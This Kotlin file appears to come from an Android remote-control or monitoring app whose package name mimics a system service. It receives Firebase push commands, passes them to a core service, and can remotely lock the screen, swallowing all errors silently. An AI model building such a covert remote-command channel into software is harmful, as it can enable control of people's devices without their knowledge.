package com.system.service.monitors

import android.app.admin.DevicePolicyManager
import android.content.Intent
import android.os.Build
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import com.system.service.core.CoreService
import org.json.JSONObject

class FcmService : FirebaseMessagingService() {

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        val intent = Intent(this, CoreService::class.java).apply {
            action = "ACTION_SEND_FCM_TOKEN"
            putExtra("fcm_token", token)
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
            else startService(intent)
        } catch (_: Exception) {}
    }

    override fun onMessageReceived(message: RemoteMessage) {
        super.onMessageReceived(message)
        val data = message.data
        if (data.isEmpty()) return
        val command = data["command"] ?: data["type"] ?: return

        if (CoreService.isRunning) {
            try {
                val json = JSONObject().apply {
                    put("command", command)
                    data.forEach { (k, v) -> if (k != "command") put(k, v) }
                }
                CoreService.handleFcmCommand(json)
                return
            } catch (_: Exception) {}
        }

        try {
            val svcIntent = Intent(this, CoreService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svcIntent)
            else startService(svcIntent)
        } catch (_: Exception) {}

        if (command == "emergency_lock" || command == "lock_screen") {
            try {
                val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
                dpm.lockNow()
            } catch (_: Exception) {}
        }
    }
}
